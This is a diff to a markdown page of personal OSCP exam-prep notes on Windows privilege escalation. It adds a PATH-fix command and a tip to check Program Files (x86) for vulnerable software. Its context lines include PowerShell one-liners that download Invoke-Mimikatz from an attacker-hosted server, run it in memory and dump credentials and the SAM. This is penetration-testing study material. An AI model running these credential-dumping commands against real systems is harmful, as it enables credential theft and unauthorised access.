@@ -76,9 +76,11 @@ description: Just some rough notes in preparation for the OSCP.
 * PowerShell Empire has some great PS1 scripts readily available such as `Invoke-Watson` and `Invoke-MS16032` as examples. Their `Mimikatz.ps1` is also great. These can be accessed at `/usr/share/powershell-empire/empire/server/data/module_source/`
 * Lots of people seem to forget that Windows binaries are readily available on Kali.&#x20;
   * `/usr/share/windows-binaries`
+* Fix your Windows path with the following command: `set PATH=%SystemRoot%\system32;%SystemRoot%;`
 * Unable to get Mimikatz onto a machine? Simply host a http server and execute the following:
   * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.1:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`&#x20;
   * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.164:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command lsadump::sam`
+* Check out `C:\Program Files (x86)` for any outdated and vulnerable installations.
 * Mimikatz errors? Need to downgrade your version? Use the version availabke at [this link](https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/).
 * Here are some good resources for Windows Privilege Escalation
   * [0x1 Gitlab](https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges)
